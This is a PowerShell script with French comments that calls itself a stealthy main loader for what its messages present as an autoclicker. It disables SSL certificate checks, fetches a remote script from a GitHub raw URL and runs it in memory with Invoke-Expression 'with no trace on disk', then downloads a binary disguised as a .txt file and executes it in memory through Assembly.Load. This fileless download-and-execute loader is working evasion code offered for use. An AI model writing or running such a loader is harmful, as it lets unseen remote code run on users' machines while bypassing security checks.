# script.ps1 - Le Chef d'Orchestre Furtif (Loader Principal)

# Configuration GitHub
$githubUser = "thegoatofapi"
$githubRepo = "mth"
$githubBranch = "main"

# Fonction pour exécuter de manière furtive
function Execute-Stealth {
    param([string]$url)
    
    try {
        # Télécharger et exécuter en mémoire (pas de trace sur disque)
        $content = (New-Object System.Net.WebClient).DownloadString($url)
        Invoke-Expression $content
    } catch {
        # Mode silencieux en cas d'erreur
        exit 1
    }
}

# Préparer l'environnement réseau
try {
    # Ignorer les erreurs SSL si nécessaire
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
} catch { }

# Étape 1: Télécharger et exécuter LC.ps1 (vérification HWID)
$lcUrl = "https://raw.githubusercontent.com/$githubUser/$githubRepo/$githubBranch/LC.ps1"

Write-Host "Verification d'authentification..." -ForegroundColor Yellow

try {
    Execute-Stealth -url $lcUrl
} catch {
    exit 1
}

# Si on arrive ici, le HWID est valide (LC.ps1 aurait arrêté sinon)
Write-Host "Authentification reussie!" -ForegroundColor Green
Write-Host ""

# Étape 2: Télécharger et exécuter file.txt (le binaire PE)
$fileUrl = "https://raw.githubusercontent.com/$githubUser/$githubRepo/$githubBranch/file.txt"

Write-Host "Chargement de l'application..." -ForegroundColor Yellow

try {
    # Télécharger le binaire (masqué en .txt)
    $webClient = New-Object System.Net.WebClient
    $exeBytes = $webClient.DownloadData($fileUrl)
    $webClient.Dispose()
    
    Write-Host "Application chargee! ($($exeBytes.Length) bytes)" -ForegroundColor Green
    Write-Host ""
    
    # Charger et exécuter le binaire PE en mémoire
    $assembly = [System.Reflection.Assembly]::Load($exeBytes)
    $entryPoint = $assembly.EntryPoint
    
    if ($entryPoint -ne $null) {
        Write-Host "Lancement de l'application..." -ForegroundColor Yellow
        
        # Lancer dans un thread STA pour la GUI
        $thread = New-Object System.Threading.Thread([System.Threading.ThreadStart]{
            try {
                # S'assurer que les styles visuels sont activés
                [System.Windows.Forms.Application]::EnableVisualStyles()
                [System.Windows.Forms.Application]::SetCompatibleTextRenderingDefault($false)
                
                # Lancer l'application
                $entryPoint.Invoke($null, @())
            } catch {
                Write-Host "Erreur dans le thread: $($_.Exception.Message)" -ForegroundColor Red
                Write-Host "StackTrace: $($_.Exception.StackTrace)" -ForegroundColor Red
            }
        })
        $thread.SetApartmentState([System.Threading.ApartmentState]::STA)
        $thread.IsBackground = $false
        $thread.Start()
        
        # Attendre un peu pour voir si l'application démarre
        Start-Sleep -Milliseconds 500
        
        Write-Host "Application lancee!" -ForegroundColor Green
        Write-Host ""
        Write-Host "L'autoclicker devrait etre ouvert." -ForegroundColor Cyan
        Write-Host "Fermez cette fenetre PowerShell pour arreter l'application." -ForegroundColor Yellow
        Write-Host ""
        
        # Attendre que le thread se termine (PowerShell reste ouvert)
        # Cela maintient l'application active tant qu'elle tourne
        while ($thread.IsAlive) {
            Start-Sleep -Milliseconds 100
        }
        
        # Si le thread s'est terminé
        if (-not $thread.IsAlive) {
            Write-Host "Application arretee." -ForegroundColor Yellow
        }
        
        Write-Host "Application arretee." -ForegroundColor Yellow
    } else {
        Write-Host "ERREUR: Point d'entree introuvable!" -ForegroundColor Red
        Read-Host "Appuyez sur Entree pour fermer"
    }
    
} catch {
    Write-Host ""
    Write-Host "ERREUR: $_" -ForegroundColor Red
    Write-Host "Details: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host ""
    Read-Host "Appuyez sur Entree pour fermer"
}

